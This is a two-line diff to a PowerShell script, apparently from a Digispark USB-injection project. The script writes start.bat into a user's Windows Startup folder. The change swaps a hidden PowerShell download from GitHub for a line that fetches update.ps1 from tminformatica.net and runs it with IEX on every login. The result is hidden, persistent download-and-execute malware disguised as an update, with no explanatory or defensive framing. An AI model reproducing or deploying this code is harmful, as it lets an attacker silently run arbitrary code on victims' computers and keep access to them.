@@ -1,2 +1,2 @@
 $arquivo = New-Item -Path 'C:\Users\Izael Magalhaes\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\start.bat' -ItemType "file"
-"powershell.exe -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/izaelbm/Digispark/main/update_x.ps1','C:\WindowsUpdate\update_x.ps1')" > $arquivo
+"powershell.exe -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://tminformatica.net/temp/update.ps1')" > $arquivo
